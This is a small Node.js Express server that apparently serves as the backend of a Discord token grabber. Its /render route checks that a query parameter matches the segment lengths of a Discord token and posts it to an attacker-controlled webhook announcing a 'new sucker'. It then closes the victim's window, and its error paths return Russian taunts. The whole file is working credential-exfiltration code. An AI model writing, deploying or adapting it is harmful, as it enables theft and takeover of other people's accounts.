const express = require('express')
const app = express()
const port = process.env.PORT || 3000

const webhook = process.env.webhook || "example.com";

app.get('/render', async (req,res) => {
    try {
        if (!req.query) {  res.send('я твою матушку в кино водил и сладкой ватой угощал'); return }
    if (!req.query.xyz) {  res.send('я твою матушку в кино водил и сладкой ватой угощал'); return  }

    const token = req.query.xyz
    if (!token) { res.send('я твою матушку в кино водил и сладкой ватой угощал'); return}
    const segments = token.split(".")
    if (segments[0].length != 26) { res.send('я твою матушку в кино водил и сладкой ватой угощал'); return  }
    if (segments[1].length != 6) { res.send('я твою матушку в кино водил и сладкой ватой угощал'); return  }
    if (segments[2].length != 38) { res.send('я твою матушку в кино водил и сладкой ватой угощал'); return  }

    const content = '@everyone Новый лох! \n ```' + token + '```'

    const response = await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content })
    })

    res.send(`
    <script>
        window.close()
    </script>    
        `) 
    } catch {
        res.send('я твою матушку в кино водил и сладкой ватой угощал')
    }
})

app.listen(port)
